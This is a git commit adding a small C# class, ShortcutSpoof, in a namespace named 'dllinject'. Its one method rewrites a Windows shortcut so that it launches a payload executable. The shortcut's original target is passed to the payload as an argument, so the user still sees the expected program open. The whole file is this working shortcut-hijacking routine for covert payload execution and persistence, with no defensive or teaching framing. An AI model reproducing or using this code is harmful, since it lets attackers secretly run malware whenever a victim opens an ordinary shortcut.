f84027f5a370e73653de13807b8850665dd113fc
proxytype <shlomiruder@gmail.com>
2020-05-20 00:12:31 +0300

    Add files via upload

---
+++ ShortcutSpoof.cs
@@ -0,0 +1,28 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using IWshRuntimeLibrary;
+using Shell32;
+
+namespace dllinject
+{
+    public class ShortcutSpoof
+    {
+        public void changeShortcut(string shortcutLink, string executePayloadLink) {
+
+            WshShell shell = new WshShell();
+            IWshShortcut link = shell.CreateShortcut(shortcutLink);
+            string originalTarget = link.TargetPath;
+            
+            //set original target as argument for payload
+            link.TargetPath = executePayloadLink + originalTarget;
+
+            link.Save();
+        }
+
+
+
+    }
+}
